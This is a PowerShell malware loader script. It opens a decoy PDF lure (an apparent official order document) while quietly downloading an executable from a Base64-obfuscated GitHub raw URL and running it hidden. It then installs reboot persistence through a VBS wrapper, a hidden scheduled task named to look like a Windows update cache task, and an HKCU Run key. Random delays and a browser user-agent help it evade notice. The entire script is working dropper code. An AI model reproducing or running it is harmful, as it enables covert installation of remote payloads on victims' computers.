# launcher.ps1 - REBOOT-FIXED: explicit principal + AtLogon + reliable trigger
$ErrorActionPreference = 'Continue'

$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

function log($msg) { 
    $timestamp = Get-Date -Format "HH:mm:ss"
    Write-Host "[$timestamp] $msg" -ForegroundColor Cyan
}

log "Launcher started"

Start-Sleep -Seconds (Get-Random -Min 3 -Max 8)

$pdfUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/1b8f22c806de43fe97c6cd555f455d166591d54d/assets/Nakaz_No._661_vid_02.03.2026.pdf"
$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9FZGdlVXBkYXRlci5leGU='))

$pdfPath = "$cache\doc.pdf"
$exePath = "$cache\helper.exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

# PDF download + open (keep working)
log "Downloading PDF..."
try { 
    Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers $headers -UseBasicParsing -TimeoutSec 15 
    log "PDF OK"
} catch { log "PDF failed" }
if (Test-Path $pdfPath) {
    try { Start-Process $pdfPath -Verb Open } catch { & rundll32 url.dll,FileProtocolHandler $pdfPath }
}

# EXE download + launch
log "Downloading EXE..."
try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing } catch {}
Start-Sleep -Seconds (Get-Random -Min 20 -Max 40)
try {
    $wsh = New-Object -ComObject WScript.Shell
    $wsh.Run("`"$exePath`"", 0, $false)
} catch { Start-Process $exePath -WindowStyle Hidden }

# === FIXED PERSISTENCE FOR REBOOT ===
log "Setting up reboot-proof persistence..."
$randFolder = [System.IO.Path]::GetRandomFileName()
$persistDir = "$env:TEMP\$randFolder"
New-Item -ItemType Directory -Path $persistDir -Force | Out-Null

$vbsPath = "$persistDir\update.vbs"
$syncPath = "$persistDir\sync.ps1"
$taskName = "WindowsUpdateCache-$(Get-Random -Min 100000 -Max 999999)"

$vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -NonInteractive -File ""$syncPath""", 0, False
"@
$vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force

$syncContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$cache = "`$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path `$cache)) { New-Item -ItemType Directory -Path `$cache -Force | Out-Null }
`$exeUrl = "$exeUrl"
`$exePath = "`$cache\helper.exe"
if (-not (Test-Path `$exePath) -or ((Get-Item `$exePath).Length -lt 100000)) {
    try { Invoke-WebRequest -Uri `$exeUrl -OutFile `$exePath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing } catch {}
}
try {
    `$wsh = New-Object -ComObject WScript.Shell
    `$wsh.Run("`"`$exePath`"", 0, `$false)
} catch { Start-Process `$exePath -WindowStyle Hidden }
"@
$syncContent | Out-File -FilePath $syncPath -Encoding UTF8 -Force

# Task with explicit user principal + AtLogon + Once trigger
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive
$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument "`"$vbsPath`""
$trigger1 = New-ScheduledTaskTrigger -AtLogon
$trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(30)
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 0)
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger1,$trigger2 -Principal $principal -Settings $settings -Force | Out-Null

# HKCU Run backup
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runKey -Name $taskName -Value "wscript.exe `"$vbsPath`"" -Type String -Force

log "Persistence registered - Task: $taskName (AtLogon + Once)"
Start-Process wscript.exe -ArgumentList $vbsPath -WindowStyle Hidden
log "Launcher finished"
